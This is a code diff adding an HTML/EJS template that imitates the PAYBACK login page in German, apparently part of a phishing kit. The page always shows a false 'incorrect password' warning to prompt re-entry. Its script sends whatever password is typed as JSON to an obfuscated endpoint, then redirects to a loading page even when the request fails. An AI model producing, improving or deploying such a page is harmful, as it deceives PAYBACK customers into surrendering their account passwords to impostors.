@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>PAYBACK</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+        <style>
+            :root {
+                --bg-color: #FFFFFF;
+                --text-dark: #222222;
+                --text-muted: #666666;
+                --card-border: #ECECEC;
+                --input-border: #DFDFDF;
+                --btn-grey: #BDBEC2;
+                --btn-blue: #003EB0;
+                --btn-blue-hover: #003399;
+                --btn-text: #FFFFFF;
+                --link-blue: #0056B3;
+                --checkbox-blue: #003EB0;
+                --divider-grey: #C6C7CA;
+                --err-bg: #FDECEC;
+                --err-border: #DC3545;
+                --err-text: #B42318;
+                --font-stack: Arial, "Helvetica Neue", Helvetica, sans-serif;
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html,
+            body {
+                min-height: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                width: 100%;
+            }
+
+            body {
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                background-color: var(--bg-color);
+                color: var(--text-dark);
+                font-family: var(--font-stack);
+                text-align: center;
+                direction: ltr;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+
+            /* =========================================================
+           PAGE WRAPPER (Flex column for sticky footer)
+           ========================================================= */
+            .page-container {
+                width: 100%;
+                max-width: 1200px;
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin: 0 auto !important;
+                padding-top: 16px;
+                box-sizing: border-box;
+                background-color: var(--bg-color);
+                text-align: center;
+            }
+
+            /* Top Header Logo (public/img/bota.png) */
+            .top-header-logo {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                flex-shrink: 0;
+                margin: 0 auto;
+                text-align: center;
+            }
+
+            .top-header-logo img {
+                width: 120px;
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+
+            /* =========================================================
+           MAIN CONTENT AREA: Fills vertical space, pushes footer down
+           ========================================================= */
+            .main-content-area {
+                flex: 1 0 auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+                padding: 0 16px;
+                box-sizing: border-box;
+                margin: 0 auto;
+            }
+
+            /* Information Box (Login Card):
+           Positioned approximately 3 cm (113 px) below the bottom edge of the logo */
+            .login-card {
+                width: 500px;
+                max-width: 92vw;
+                margin-top: 113px;
+                /* 3 cm (113 px) spacing below logo */
+                background-color: #FFFFFF;
+                border: 1px solid var(--card-border);
+                border-radius: 10px;
+                padding: 17px 18px 18px 18px;
+                box-sizing: border-box;
+                display: flex;
+                flex-direction: column;
+                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+                margin-left: auto;
+                margin-right: auto;
+                text-align: left;
+            }
+
+            /* Card Logos: bota.png and sosa.png side by side */
+            .card-logo {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                gap: 22px;
+                margin-bottom: 8px;
+            }
+
+            .card-logo .logo-bota {
+                width: 76px;
+                height: auto;
+                display: block;
+            }
+
+            .card-logo .logo-sosa {
+                width: 48px;
+                height: auto;
+                display: block;
+            }
+
+            /* Card Title - 30% larger */
+            .card-title {
+                text-align: center;
+                font-size: 25px;
+                font-weight: 700;
+                color: #1A1A1A;
+                line-height: 1.2;
+                margin-bottom: 14px;
+                letter-spacing: -0.2px;
+            }
+
+            /* User badge / change username row */
+            .user-display-row {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                margin-top: -2px;
+                margin-bottom: 18px;
+                background-color: #f7f7f8;
+                border: 1px solid #e5e5e7;
+                border-radius: 20px;
+                padding: 5px 14px;
+                width: fit-content;
+                max-width: 100%;
+                margin-left: auto;
+                margin-right: auto;
+                box-sizing: border-box;
+            }
+
+            .user-display-row .user-text {
+                font-size: 14px;
+                font-weight: 600;
+                color: var(--text-dark);
+                margin: 0;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                max-width: 220px;
+            }
+
+            .edit-email {
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                color: var(--link-blue);
+                text-decoration: none;
+                transition: opacity 0.15s, transform 0.15s;
+            }
+
+            .edit-email:hover {
+                opacity: 0.8;
+                transform: scale(1.08);
+            }
+
+            .edit-email svg {
+                width: 16px;
+                height: 16px;
+                display: block;
+            }
+
+            /* =========================================================
+           RED ERROR NOTIFICATION (Above "Gibeinzuloggen")
+           ========================================================= */
+            .error-notification {
+                display: flex;
+                align-items: flex-start;
+                gap: 10px;
+                width: 100%;
+                background-color: var(--err-bg);
+                border: 1px solid var(--err-border);
+                border-radius: 6px;
+                padding: 12px 14px;
+                margin-bottom: 16px;
+                box-sizing: border-box;
+                text-align: left;
+            }
+
+            .error-icon {
+                width: 20px;
+                height: 20px;
+                flex-shrink: 0;
+                margin-top: 1px;
+            }
+
+            .error-text {
+                font-size: 13.5px;
+                font-weight: 600;
+                color: var(--err-text);
+                line-height: 1.45;
+                word-break: break-word;
+            }
+
+            /* Form Controls */
+            .form-group {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .input-label {
+                font-size: 14.5px;
+                color: var(--text-dark);
+                margin-bottom: 7px;
+                text-align: left;
+                font-weight: normal;
+            }
+
+            .input-wrapper {
+                width: 100%;
+                position: relative;
+                margin-bottom: 11px;
+            }
+
+            .input-field {
+                width: 100%;
+                height: 46px;
+                border: 1px solid var(--input-border);
+                border-radius: 4px;
+                background-color: #FFFFFF;
+                padding: 0 13px;
+                font-family: inherit;
+                font-size: 15.5px;
+                color: var(--text-dark);
+                outline: none;
+                box-sizing: border-box;
+            }
+
+            .input-field:focus {
+                border-color: #999999;
+            }
+
+            .input-field::placeholder {
+                color: #757575;
+                opacity: 1;
+            }
+
+            .input-wrapper.password-wrapper .input-field {
+                padding-right: 42px;
+            }
+
+            .toggle-password-btn {
+                position: absolute;
+                right: 11px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                padding: 2px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #707070;
+            }
+
+            .toggle-password-btn svg {
+                width: 21px;
+                height: 21px;
+            }
+
+            /* Link below password - ALWAYS BLUE #0056B3, NEVER PURPLE */
+            .forgot-password-link,
+            .forgot-password-link:link,
+            .forgot-password-link:visited {
+                font-size: 14px;
+                color: var(--link-blue);
+                text-decoration: underline;
+                align-self: flex-start;
+                margin-top: -1px;
+                margin-bottom: 15px;
+                cursor: pointer;
+            }
+
+            .forgot-password-link:hover,
+            .forgot-password-link:active {
+                color: #003d82;
+                text-decoration: underline;
+            }
+
+            /* Submit Button - 30% larger, BOLD (font-weight: 700) */
+            .submit-btn-wrapper {
+                display: flex;
+                justify-content: center;
+                width: 100%;
+                margin-bottom: 15px;
+            }
+
+            .btn-submit {
+                width: 115px;
+                height: 40px;
+                background-color: var(--btn-grey);
+                color: var(--btn-text);
+                border: none;
+                border-radius: 8px;
+                font-family: inherit;
+                font-size: 14.5px;
+                font-weight: 700;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: not-allowed;
+                padding: 0;
+                box-sizing: border-box;
+                transition: background-color 0.15s, opacity 0.15s;
+            }
+
+            /* Enabled/Active blue state */
+            .btn-submit:not(:disabled),
+            .btn-submit.active {
+                background-color: var(--btn-blue);
+                cursor: pointer;
+            }
+
+            .btn-submit:not(:disabled):hover,
+            .btn-submit.active:hover {
+                background-color: var(--btn-blue-hover);
+            }
+
+            /* Disabled gray state */
+            .btn-submit:disabled,
+            .btn-submit.disabled {
+                background-color: var(--btn-grey);
+                cursor: not-allowed;
+                opacity: 1;
+            }
+
+            /* Checkbox Row */
+            .checkbox-row {
+                display: inline-flex;
+                align-items: center;
+                gap: 9px;
+                align-self: flex-start;
+                cursor: pointer;
+                user-select: none;
+                position: relative;
+            }
+
+            /* Native checkbox: hidden visually, accessible & standard */
+            .real-checkbox {
+                position: absolute;
+                opacity: 0;
+                width: 0;
+                height: 0;
+                margin: 0;
+                pointer-events: none;
+            }
+
+            /* Custom Checkbox Box: Unchecked by default = white background, gray border */
+            .custom-checkbox {
+                width: 16px;
+                height: 16px;
+                background-color: #FFFFFF;
+                border: 1.5px solid #8E8E93;
+                border-radius: 3px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-shrink: 0;
+                box-sizing: border-box;
+                transition: background-color 0.15s ease, border-color 0.15s ease;
+            }
+
+            /* SVG checkmark: hidden by default when unchecked */
+            .custom-checkbox svg {
+                width: 10px;
+                height: 10px;
+                stroke: #FFFFFF;
+                stroke-width: 2.2;
+                fill: none;
+                display: none;
+            }
+
+            /* Checked state: blue background, blue border, visible white checkmark */
+            .real-checkbox:checked+.custom-checkbox,
+            .custom-checkbox.checked {
+                background-color: var(--checkbox-blue);
+                border-color: var(--checkbox-blue);
+            }
+
+            .real-checkbox:checked+.custom-checkbox svg,
+            .custom-checkbox.checked svg {
+                display: block;
+            }
+
+            .checkbox-label {
+                font-size: 14.5px;
+                color: var(--text-dark);
+                line-height: 1;
+                cursor: pointer;
+            }
+
+            /* =========================================================
+           STICKY FOOTER (margin-top: auto anchors to viewport bottom)
+           ========================================================= */
+            .footer-wrapper {
+                margin-top: auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                flex-shrink: 0;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .divider-line {
+                width: 685px;
+                max-width: 92vw;
+                border-top: 1px solid var(--divider-grey);
+                margin-top: 36px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            .page-footer-nav {
+                width: 100%;
+                max-width: 920px;
+                margin-top: 32px;
+                margin-bottom: 36px;
+                padding: 0 16px;
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                align-items: center;
+                gap: 12px 20px;
+                box-sizing: border-box;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .footer-nav-link,
+            .footer-nav-link:link,
+            .footer-nav-link:visited {
+                font-size: 13.5px;
+                font-weight: 700;
+                color: var(--text-dark);
+                text-decoration: none;
+                white-space: nowrap;
+            }
+
+            .footer-nav-link:hover {
+                text-decoration: underline;
+            }
+
+            /* =========================================================
+           RESPONSIVE - TABLETS & MOBILE
+           ========================================================= */
+            @media (max-width: 720px) {
+                .error-notification {
+                    padding: 11px 13px;
+                    margin-bottom: 14px;
+                }
+
+                .error-text {
+                    font-size: 13px;
+                }
+
+                .page-footer-nav {
+                    gap: 12px 18px;
+                }
+
+                .footer-nav-link,
+                .footer-nav-link:link,
+                .footer-nav-link:visited {
+                    font-size: 12.5px;
+                    font-weight: 700;
+                }
+
+                .login-card {
+                    width: 92vw;
+                    max-width: 352px;
+                    margin-top: clamp(48px, 9vh, 113px);
+                }
+            }
+        </style>
+</head>
+
+<body>
+
+    <div class="page-container">
+
+        <!-- Top Header Logo (public/img/bota.png) -->
+        <header class="top-header-logo">
+            <img src="/img/bota.png" alt="Logo"
+                onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+        </header>
+
+        <!-- Main Content Area: flex: 1; pushes footer to bottom -->
+        <main class="main-content-area">
+
+            <!-- Main Information Box: 3 cm (113 px) below logo -->
+            <div class="login-card">
+
+                <!-- Card Logo -->
+                <div class="card-logo">
+                    <img src="/img/boto.png" alt="Logo" class="logo-bota"
+                        onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+                    <img src="/img/sosa.png" alt="Logo" class="logo-sosa"
+                        onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/sosa.png';}">
+                </div>
+
+                <!-- Red Error Notification Box -->
+                <div class="error-notification" id="errorNotification" role="alert">
+                    <svg class="error-icon" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-hidden="true">
+                        <circle cx="10" cy="10" r="9" stroke="#DC3545" stroke-width="1.8" />
+                        <line x1="10" y1="5.5" x2="10" y2="10.5" stroke="#DC3545" stroke-width="1.8"
+                            stroke-linecap="round" />
+                        <circle cx="10" cy="14" r="1.1" fill="#DC3545" />
+                    </svg>
+                     <div class="error-text" style="font-weight: normal; font-size: 12px;">
+                        Das eingegebene Passwort ist falsch.
+                    </div>
+                </div>
+
+                <% if (typeof pass !=='undefined' && pass) { %>
+                    <!-- User Account / Change Username Row -->
+                    <div class="user-display-row">
+                        <div class="change">
+                            <p class="user-text">
+                                <%= pass %>
+                            </p>
+                        </div>
+                        <a href="/" class="edit-email" title="Benutzername bearbeiten"
+                            aria-label="Benutzername bearbeiten">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
+                                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round">
+                                <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
+                            </svg>
+                        </a>
+                    </div>
+                    <% } %>
+
+                        <!-- Form -->
+                        <form id="loginForm" autocomplete="on">
+                            <div class="form-group">
+
+                                <!-- Password Label -->
+                                <label for="password" class="input-label">Passwort</label>
+
+                                <!-- Standard Password Input Field (removes 4-digit restriction, supports any length & characters) -->
+                                <div class="input-wrapper password-wrapper">
+                                    <input type="password" id="password" name="password" class="input-field"
+                                        placeholder="Passwort" required autocomplete="current-password" autofocus>
+                                    <button type="button" class="toggle-password-btn" id="togglePasswordBtn"
+                                        aria-label="Passwort anzeigen" title="Passwort anzeigen">
+                                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"
+                                            stroke-linecap="round" stroke-linejoin="round">
+                                            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
+                                            <circle cx="12" cy="12" r="3" />
+                                        </svg>
+                                    </button>
+                                </div>
+
+                                <!-- Forgot Password Link: Blue color #0056B3 -->
+                                <a href="#" class="forgot-password-link">Passwort vergessen?</a>
+
+                                <!-- Submit Button: Bold text, initially disabled and gray -->
+                                <div class="submit-btn-wrapper">
+                                    <button type="submit" class="btn-submit" id="loginSubmitBtn"
+                                        disabled>Einloggen</button>
+                                </div>
+
+                                <!-- Checkbox Row: Unchecked by default -->
+                                <label class="checkbox-row" id="rememberMeRow" for="rememberMe">
+                                    <input type="checkbox" id="rememberMe" name="rememberMe" class="real-checkbox">
+                                    <span class="custom-checkbox" aria-hidden="true">
+                                        <svg viewBox="0 0 12 12">
+                                            <polyline points="2,6 5,9 10,3" />
+                                        </svg>
+                                    </span>
+                                    <span class="checkbox-label">eingeloggt bleiben</span>
+                                </label>
+
+                            </div>
+                        </form>
+
+            </div>
+
+        </main>
+
+        <!-- Sticky Footer Wrapper -->
+        <div class="footer-wrapper">
+            <!-- Divider Line -->
+            <div class="divider-line"></div>
+
+            <!-- Footer Navigation Links -->
+            <footer class="page-footer-nav">
+                <a href="#" class="footer-nav-link">Impressum</a>
+                <a href="#" class="footer-nav-link">Unternehmen</a>
+                <a href="#" class="footer-nav-link">Arbeiten bei PAYBACK</a>
+                <a href="#" class="footer-nav-link">Fragen &amp; Hilfe</a>
+                <a href="#" class="footer-nav-link">Datenschutz</a>
+                <a href="#" class="footer-nav-link">Barrierefreiheit</a>
+                <a href="#" class="footer-nav-link">Cookie-Einstellungen</a>
+            </footer>
+        </div>
+
+    </div>
+
+    <!-- Interactive Script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const passwordInput = document.getElementById('password');
+            const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+            const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+            const rememberMeInput = document.getElementById('rememberMe');
+            const customCheckbox = document.querySelector('.custom-checkbox');
+
+            // Button activation handler
+            function updateButtonState() {
+                if (!passwordInput || !loginSubmitBtn) return;
+                const hasPassword = passwordInput.value.length > 0;
+                if (hasPassword) {
+                    loginSubmitBtn.disabled = false;
+                    loginSubmitBtn.classList.remove('disabled');
+                    loginSubmitBtn.classList.add('active');
+                } else {
+                    loginSubmitBtn.disabled = true;
+                    loginSubmitBtn.classList.add('disabled');
+                    loginSubmitBtn.classList.remove('active');
+                }
+            }
+
+            if (passwordInput) {
+                passwordInput.addEventListener('input', updateButtonState);
+                passwordInput.addEventListener('change', updateButtonState);
+                passwordInput.addEventListener('keyup', updateButtonState);
+            }
+            updateButtonState();
+
+            // Checkbox sync
+            function syncCheckboxState() {
+                if (rememberMeInput && customCheckbox) {
+                    if (rememberMeInput.checked) {
+                        customCheckbox.classList.add('checked');
+                    } else {
+                        customCheckbox.classList.remove('checked');
+                    }
+                }
+            }
+
+            if (rememberMeInput) {
+                rememberMeInput.addEventListener('change', syncCheckboxState);
+            }
+            syncCheckboxState();
+
+            // Password Visibility Toggle
+            let isPasswordVisible = false;
+            if (togglePasswordBtn && passwordInput) {
+                togglePasswordBtn.addEventListener('click', function () {
+                    isPasswordVisible = !isPasswordVisible;
+                    if (isPasswordVisible) {
+                        passwordInput.type = 'text';
+                        togglePasswordBtn.setAttribute('title', 'Passwort ausblenden');
+                        togglePasswordBtn.innerHTML = `
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-7-11-7a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 5c7 0 11 7 11 7a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                                <line x1="1" y1="1" x2="23" y2="23"/>
+                            </svg>
+                        `;
+                    } else {
+                        passwordInput.type = 'password';
+                        togglePasswordBtn.setAttribute('title', 'Passwort anzeigen');
+                        togglePasswordBtn.innerHTML = `
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+                                <circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        `;
+                    }
+                });
+            }
+
+            // Form Submission
+            const loginForm = document.getElementById('loginForm');
+            if (loginForm) {
+                loginForm.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    const passwordVal = passwordInput ? passwordInput.value : '';
+
+                    if (!passwordVal || passwordVal.length === 0) {
+                        return;
+                    }
+
+                    if (loginSubmitBtn) {
+                        loginSubmitBtn.disabled = true;
+                    }
+
+                    if (typeof $ !== 'undefined' && $.ajax) {
+                        $.ajax({
+                            url: '/SSwP85AgNE4pnL5mWSM',
+                            type: 'POST',
+                            contentType: 'application/json',
+                            data: JSON.stringify({ password: passwordVal }),
+                            success: function (info) {
+                                if (info && info.OK) {
+                                    window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
+                                } else {
+                                    if (loginSubmitBtn) loginSubmitBtn.disabled = false;
+                                }
+                            },
+                            error: function () {
+                                window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
+                            }
+                        });
+                    } else {
+                        fetch('/SSwP85AgNE4pnL5mWSM', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ password: passwordVal })
+                        })
+                            .then(res => res.json())
+                            .then(info => {
+                                if (info && info.OK) {
+                                    window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
+                                } else {
+                                    if (loginSubmitBtn) loginSubmitBtn.disabled = false;
+                                }
+                            })
+                            .catch(() => {
+                                window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
+                            });
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
